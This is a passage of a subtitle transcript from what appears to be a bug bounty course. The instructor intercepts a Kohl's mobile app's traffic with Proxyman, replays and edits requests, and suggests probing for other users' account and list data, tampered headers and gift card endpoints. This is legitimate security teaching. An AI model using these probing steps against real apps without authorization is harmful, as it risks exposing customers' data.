00:08:00.760 --> 00:08:01.280
favourites.

174
00:08:02.760 --> 00:08:04.480
Now we can see kohl's.com.

175
00:08:04.600 --> 00:08:06.500
So we should be able to, if I

176
00:08:06.500 --> 00:08:09.300
click search again, start to see some of

177
00:08:09.300 --> 00:08:11.820
the traffic coming through for kohl's.com.

178
00:08:12.560 --> 00:08:13.420
Yep, here we go.

179
00:08:13.500 --> 00:08:14.860
So we can see like features.

180
00:08:14.960 --> 00:08:17.100
We're seeing the requests and responses here.

181
00:08:17.440 --> 00:08:19.020
So now if we wanted to repeat one

182
00:08:19.020 --> 00:08:21.680
of these requests, say using proxy man, we

183
00:08:21.680 --> 00:08:25.540
could just click like edit and repeat here.

184
00:08:25.660 --> 00:08:27.380
We could also edit these things.

185
00:08:27.860 --> 00:08:29.320
So if we wanted to repeat this one

186
00:08:29.320 --> 00:08:31.120
in particular, we could just click edit and

187
00:08:31.120 --> 00:08:31.539
repeat.

188
00:08:32.240 --> 00:08:33.820
It'll pull up the request here.

189
00:08:33.940 --> 00:08:35.600
We'd be able to go ahead and manipulate

190
00:08:35.600 --> 00:08:38.760
any of these headers or parameters that we

191
00:08:38.760 --> 00:08:40.980
wanted to if it was sending more information.

192
00:08:41.559 --> 00:08:43.380
Looks like this one's not really sending all

193
00:08:43.380 --> 00:08:44.000
that much.

194
00:08:44.360 --> 00:08:46.780
Maybe there's other kohl's URLs here that would

195
00:08:46.780 --> 00:08:47.680
be part of this.

196
00:08:48.420 --> 00:08:50.400
So we have to go back through and

197
00:08:50.400 --> 00:08:53.860
look through all these URLs that might be

198
00:08:53.860 --> 00:08:54.740
related to kohl's.

199
00:08:54.800 --> 00:08:56.220
Like here we can see that proxy man

200
00:08:56.220 --> 00:08:59.820
is intercepting like kohl's.scene7. Probably lots of

201
00:08:59.820 --> 00:09:03.780
other ones here like api-bd-kohl's.com.

202
00:09:03.860 --> 00:09:05.640
We could enable this domain as well.

203
00:09:06.060 --> 00:09:07.500
I'm just going to pin that so it's

204
00:09:07.500 --> 00:09:09.280
nice and organised up at the top.

205
00:09:12.020 --> 00:09:13.800
Okay, and like we can go to like

206
00:09:13.800 --> 00:09:16.560
api.kohl's.bd and we should be able

207
00:09:16.560 --> 00:09:18.840
to see some of this stuff coming through

208
00:09:18.840 --> 00:09:20.540
if I do like another search in the

209
00:09:20.540 --> 00:09:21.140
application.

210
00:09:26.820 --> 00:09:28.480
Yep, you can see that it's starting to

211
00:09:28.480 --> 00:09:30.520
populate some of the requests here.

212
00:09:30.660 --> 00:09:32.040
So you want to try to go ahead

213
00:09:32.040 --> 00:09:34.400
and collect all the URLs out of here

214
00:09:34.400 --> 00:09:36.880
that would be related to kohl's and use

215
00:09:36.880 --> 00:09:40.080
proxy man to enable and disable the SSL

216
00:09:40.080 --> 00:09:40.760
pinning here.

217
00:09:40.860 --> 00:09:42.220
So you'd be able to see the requests

218
00:09:42.220 --> 00:09:45.460
and responses and again just like before we

219
00:09:45.460 --> 00:09:47.300
could edit this and repeat.

220
00:09:47.720 --> 00:09:50.140
It's a little bit more manual with proxy

221
00:09:50.140 --> 00:09:52.300
man as opposed to burp suite but I

222
00:09:52.300 --> 00:09:54.120
did want to show you one of these

223
00:09:54.120 --> 00:09:56.480
where I'm using proxy man instead of burp

224
00:09:56.480 --> 00:09:58.980
suite to intercept some of the application traffic.

225
00:09:59.600 --> 00:10:01.580
So obviously what I would do next in

226
00:10:01.580 --> 00:10:04.360
this case is go through the application step

227
00:10:04.360 --> 00:10:04.940
by step.

228
00:10:05.260 --> 00:10:07.120
So I'm able to see every single one

229
00:10:07.120 --> 00:10:09.380
of these URLs like go to kohl's charge,

230
00:10:09.600 --> 00:10:11.880
see the sign-in page there, make an

231
00:10:11.880 --> 00:10:14.280
account, see if I can see other users

232
00:10:14.280 --> 00:10:18.460
accounts information, things like that, shop by category,

233
00:10:18.640 --> 00:10:21.060
go to the different aspects of this application

234
00:10:21.060 --> 00:10:23.500
like the gift cards here, see if the

235
00:10:23.500 --> 00:10:26.240
URL maybe for redeeming a gift card is

236
00:10:26.240 --> 00:10:29.420
available, and just keep on enumerating everything out

237
00:10:29.420 --> 00:10:31.540
of the application until I've hit every single

238
00:10:31.540 --> 00:10:33.180
part of the app.

239
00:10:33.260 --> 00:10:34.820
You can see here you can create like

240
00:10:34.820 --> 00:10:36.420
a new list here so this is some

241
00:10:36.420 --> 00:10:37.580
interesting functionality.

242
00:10:38.200 --> 00:10:40.120
You can sign up for an account, create

243
00:10:40.120 --> 00:10:41.980
a list of the things that you're interested

244
00:10:41.980 --> 00:10:44.040
in, maybe there's a possibility to see other

245
00:10:44.040 --> 00:10:47.840
users lists if they're not properly securing that.

246
00:10:48.480 --> 00:10:50.220
Again I would go back to the static

247
00:10:50.220 --> 00:10:53.540
analysis process, take a look through that gigantic

248
00:10:53.540 --> 00:10:58.240
app folder that we downloaded by using anytrans

249
00:10:58.240 --> 00:11:00.020
and look through there for anything that might

250
00:11:00.020 --> 00:11:03.080
be sensitively stored from a static analysis process.

251
00:11:03.600 --> 00:11:05.420
Other things you could try to do is

252
00:11:05.420 --> 00:11:08.880
open like the logs of the iPhone to

253
00:11:08.880 --> 00:11:12.940
see if anything's stored sensitively in the logs.

254
00:11:13.080 --> 00:11:15.300
You could also obviously try to take any

255
00:11:15.300 --> 00:11:17.920
of those URL calls, try to manipulate the

256
00:11:17.920 --> 00:11:19.300
parameters and things like that.

257
00:11:19.360 --> 00:11:22.420
For example here the headers for example, you

258
00:11:22.420 --> 00:11:23.840
can see they have like an x-channel

259
00:11:23.840 --> 00:11:25.840
here, you can see if the response changes

260
00:11:25.840 --> 00:11:28.100
if you change this to Android from iOS

261
00:11:28.100 --> 00:11:28.980
for example.

262
00:11:29.720 --> 00:11:31.760
You can mess with the body as well

263
00:11:31.760 --> 00:11:34.360
to see what kind of vulnerabilities might be

264
00:11:34.360 --> 00:11:34.860
out there.

265
00:11:35.080 --> 00:11:36.920
I'm not going to go through the entire

266
00:11:36.920 --> 00:11:40.020
analysis process for this Kohl's app but that

267
00:11:40.020 --> 00:11:41.900
could be left for you to do as

268
00:11:41.900 --> 00:11:43.840
kind of a capstone of this course.

269
00:11:44.140 --> 00:11:45.820
So I hope that this gives you a

270
00:11:45.820 --> 00:11:48.360
good insight into how to do an analysis

271
00:11:48.360 --> 00:11:51.140
in an app directly from the app store

272
00:11:51.140 --> 00:11:53.340
and I hope that you have good luck

273
00:11:53.340 --> 00:11:55.600
with your bug bounty hunts in the future.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

